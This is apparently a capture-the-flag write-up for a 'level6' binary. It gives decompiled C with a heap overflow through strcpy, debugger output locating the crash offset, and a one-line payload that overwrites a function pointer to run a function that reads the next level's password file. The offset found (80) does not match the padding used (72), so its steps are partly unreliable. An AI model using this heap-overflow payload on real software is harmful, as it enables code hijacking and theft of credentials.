# Solution

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int (**v4)(void); // [esp+18h] [ebp-8h]
  int v5; // [esp+1Ch] [ebp-4h]

  v5 = malloc(64);
  v4 = (int (**)(void))malloc(4);
  *v4 = m;
  strcpy(v5, argv[1]);
  return (*v4)();
}

int m()
{
  return puts("Nope");
}

int n()
{
  return system("/bin/cat /home/user/level7/.pass");
}
```

Exploit: execute n() instead of m() by heap overflow with strcpy and argv[1]

```sh
readelf -s level6 | grep n
48: 08048454    20 FUNC    GLOBAL DEFAULT   13 n
```

```sh
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
#0] Id 1, Name: "level6", stopped 0x61616175 in ?? (), reason: SIGSEGV
gef➤  pattern search aaau
[+] Searching for '75616161'/'61616175' with period=4
[+] Found at offset 80 (little-endian search) likely
```

crafting payload: offset - n() address + n() address

```sh
./level6 $(python -c 'print("A"*72+"T\x84\x04\x08")')
```
